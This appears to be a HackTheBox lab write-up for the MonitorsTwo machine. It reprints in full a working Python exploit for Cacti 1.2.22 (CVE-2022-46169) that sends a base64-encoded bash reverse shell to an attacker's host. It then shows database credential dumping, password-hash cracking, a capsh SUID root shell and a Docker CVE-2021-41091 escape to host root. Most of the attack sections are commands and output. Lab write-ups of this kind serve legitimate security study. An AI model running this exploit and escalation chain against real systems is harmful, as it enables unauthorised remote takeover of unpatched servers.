---
title: HackTheBox - MonitorsTwo
author: 0
date: 2023-05-04 16:00:00 +0800
categories: [htb, machine]
tags: [vulnerable-componenets, remote-code-execution, suid, gtfobin, docker-escape, CVE-2021-41091]
render_with_liquid: false
---

This machine starts off with a login page for cacti.
> Cacti is a performance and fault management framework and a frontend to RRDTool - a Time Series Database (TSDB). It stores all of the necessary information to create performance management Graphs in either MariaDB or MySQL, and then leverages its various Data Collectors to populate RRDTool based TSDB with that performance data.

![Homepage](/assets/img/htb-monitorstwo-homepage.png)

## Reconnaissance

The nmap result doesn't provide anything special.
```bash
Nmap scan report for 10.10.11.211
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We notice there is a version number under the login screen (v1.2.22), when looking up this version we find out it is vulnerable to remote code execution.

## Exploit

We find a [PoC on Github](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application/blob/main/exploit/exploit.py) but this needs to be modified, we should put localhost instead of the remote ip in the `X-Forwarded-For` header.

```
#!/usr/bin/env python3

# Exploit Title: Cacti v1.2.22 - Remote Command Execution (RCE)
# Exploit Author: Riadh BOUCHAHOUA
# Discovery Date: 2022-12-08 
# Vendor Homepage: https://www.cacti.net/
# Software Links : https://github.com/Cacti/cacti
# Tested Version: 1.2.2x <= 1.2.22
# CVE: CVE-2022-46169
# Tested on OS: Debian 10/11

import random
import httpx, urllib

class Exploit:
    def __init__(self, url, proxy=None, rs_host="",rs_port=""):
        self.url = url 
        self.session = httpx.Client(headers={"User-Agent": self.random_user_agent()},verify=False,proxies=proxy)
        self.rs_host = rs_host
        self.rs_port = rs_port

    def exploit(self):
        # cacti local ip from the url for the X-Forwarded-For header
        #local_cacti_ip  = self.url.split("//")[1].split("/")[0]
        local_cacti_ip = '127.0.0.1'
        headers = {
            'X-Forwarded-For': f'{local_cacti_ip}'
        }
        
        revshell = f"bash -c 'exec bash -i &>/dev/tcp/{self.rs_host}/{self.rs_port} <&1'"
        import base64
        b64_revshell = base64.b64encode(revshell.encode()).decode()
        payload = f";echo {b64_revshell} | base64 -d | bash -"
        payload = urllib.parse.quote(payload)
        urls = []
        count = 0
        # Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)
        for host_id in range(1,100):
            for local_data_ids in range(1,100):
                urls.append(f"{self.url}/remote_agent.php?action=polldata&local_data_ids[]={local_data_ids}&host_id={host_id}&poller_id=1{payload}")
                
        for url in urls:
            r = self.session.get(url,headers=headers)
            print(f"{url} - {r.status_code} - {r.text}" )
        pass

    def random_user_agent(self):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
           "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
        ]
        return random.choice(ua_list)

def parse_args():
    import argparse
    
    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", "--url", help="Target URL (e.g. http://192.168.1.100/cacti)")
    argparser.add_argument("-p", "--remote_port", help="reverse shell port to connect to", required=True)
    argparser.add_argument("-i", "--remote_ip", help="reverse shell IP to connect to", required=True)
    return argparser.parse_args()

def main() -> None:
    # Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL 
    args = parse_args()
    e = Exploit(args.url, rs_host=args.remote_ip, rs_port=args.remote_port)
    e.exploit()

if __name__ == "__main__":
    main()
```

When we create our listeren and then run the python script, we get a reverse shell at host_id=1 and local_data_id=6.

```bash
$ python3 cacti_exploit2.py -u http://10.10.11.211/ -i 10.10.14.44 -p 1234
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"79","rrd_name":"proc","local_data_id":"1"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=2&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"1min:2.07 5min:1.24 10min:0.71","rrd_name":"","local_data_id":"2"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=3&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"0","rrd_name":"users","local_data_id":"3"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=4&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"2149344","rrd_name":"mem_buffers","local_data_id":"4"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=5&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=6&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - [{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
http://10.10.11.211//remote_agent.php?action=polldata&local_data_ids[]=7&host_id=1&poller_id=1%3Becho%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvMTAuMTAuMTQuNDQvMTIzNCA8JjEn%20%7C%20base64%20-d%20%7C%20bash%20- - 200 - []
```

### Lateral movement
We are logged in as www-data and this is looks like a docker environment as there is no other user present on this system.

In this phase, there were some rabbit holes. For example, you could find   the database host, username and password in `./include/config.php` but connecting to this database didn't work.

After some more researching, you can find a file called `entrypoint.sh` in the root directory. Which contains the instructions on how to connect to the local database.

```bash
bash-5.1$ cd /
cd /
bash-5.1$ ls
ls
bash
bin
boot
dev
entrypoint.sh
etc
home
lib
lib64
me
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
bash-5.1$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
bash-5.1$ 
```

We can now iterate over some interesting tables to try to gather credentials to other users. We notice the table `user_auth` which contains password hashes for the users admin and marcus.

```bash
www-data@50bca5e748b0:/$ mysql --host=db --user=root --password=root cacti -e "show tables"
< --user=root --password=root cacti -e "show tables"
Tables_in_cacti
aggregate_graph_templates
aggregate_graph_templates_graph
aggregate_graph_templates_item
...
snmpagent_notifications_log
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
user_log
vdef
vdef_items
version
www-data@50bca5e748b0:/$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
< --password=root cacti -e "SELECT * FROM user_auth"
admin   $2y$10$IhEA.**REDACTED**/iuqMft/llx8utpR1hjC
marcus  $2y$**REDACTED**/MhFYK4C
```

We can now use john the ripper to crack the hashes.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt             
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 0.00% (ETA: 2023-05-09 05:00) 0g/s 44.18p/s 88.37c/s 88.37C/s miranda..ilovehim
0g 0:00:00:14 0.00% (ETA: 2023-05-09 07:08) 0g/s 44.26p/s 88.52c/s 88.52C/s robbie..taurus
0g 0:00:00:15 0.00% (ETA: 2023-05-09 06:05) 0g/s 44.52p/s 89.05c/s 89.05C/s chacha..maldita
f**REDACTED**y      (?) 
```

We can use this password to SSH into marcus their account, where we can find the user flag.

```bash
marcus@monitorstwo:~$ ls -lah
total 28K
drwxr-xr-x 3 marcus marcus 4.0K Mar 22 12:13 .
drwxr-xr-x 3 root   root   4.0K Jan  5 09:51 ..
lrwxrwxrwx 1 root   root      9 Jan  5 10:12 .bash_history -> /dev/null
-rw-r--r-- 1 marcus marcus  220 Jan  5 09:51 .bash_logout
-rw-r--r-- 1 marcus marcus 3.7K Jan  5 09:51 .bashrc
drwx------ 2 marcus marcus 4.0K Mar 21 10:49 .cache
-rw-r--r-- 1 marcus marcus  807 Jan  5 09:51 .profile
-rw-r----- 1 root   marcus   33 May  4 16:46 user.txt
marcus@monitorstwo:~$ cat user.txt
6b**REDACTED**db
```

## Privilege Escalation
We notice the box we SSHd into can be vulnerable to CVE-2021-41091. As it states they are using docker version `20.10.5`.

```bash
marcus@monitorstwo:~$ docker version
Client:
 Version:           20.10.5+dfsg1
 API version:       1.41
 Go version:        go1.15.9
 Git commit:        55c4c88
 Built:             Wed Aug  4 19:55:57 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
```

>CVE-2021-41091 is  a bug that was found in Moby (Docker Engine) where the data directory (typically `/var/lib/docker`) contained subdirectories with insufficiently restricted permissions, allowing otherwise unprivileged Linux users to traverse directory contents and execute programs. When containers included executable programs with extended permission bits (such as `setuid`), unprivileged Linux users could discover and execute those programs

As the filesystem of these containers will be accessible to us through marcus their account, we will be able to escalate our privileges on the server.

To exploit this, we will need to:
1. Get root privileges on the docker box (www-data).
2. `setuid` on `/bin/bash` of the container.
3. Access the privileged `/bin/bash` of the container, via the server (marcus) and spawn a privileged shell on the server.

### Prepare the container

We need to first find a way to get root in the docker container. We check for any binaries that have the SUID enabled, `/sbin/capsh` looks interesting. By looking `capsh` on [gtfobins.io](https://gtfobins.github.io/) we find a way to get a root shell in the container. Once we have root privileges we add SUID to `/bin/bash`.

```bash
bash-5.1$ find / -type f -perm -u=s -ls 2>/dev/null
find / -type f -perm -u=s -ls 2>/dev/null
    42364     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
    42417     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
    42317     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
    42314     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
    42407     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
     5431     32 -rwsr-xr-x   1 root     root        30872 Oct 14  2020 /sbin/capsh
    41798     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /bin/mount
    41819     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /bin/umount
    41766   1208 -rwsr-sr-x   1 root     root      1234376 Mar 27  2022 /bin/bash
    41813     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /bin/su
bash-5.1$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
whoami
root
chmod u+s /bin/bash
```

### Perform the escalation

On our SSH connect we can now run the [PoC script](https://github.com/UncleJ4ck/CVE-2021-41091/blob/main/exp.sh), to gain root privileges. The script looks over all overlay2 directories, which are the directories docker uses for their containers, to see if it can find `/bin/bash` with the SUID.

When the script has run we run `/bin/bash -p`  which spawns a new shell, that new shell inherits the elevated privileges (-p) granted by the `setuid` bit on the `/bin/bash` from the container.

```bash
marcus@monitorstwo:/tmp$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didnt spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p                                                                                        
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
77**REDACTED**a1
```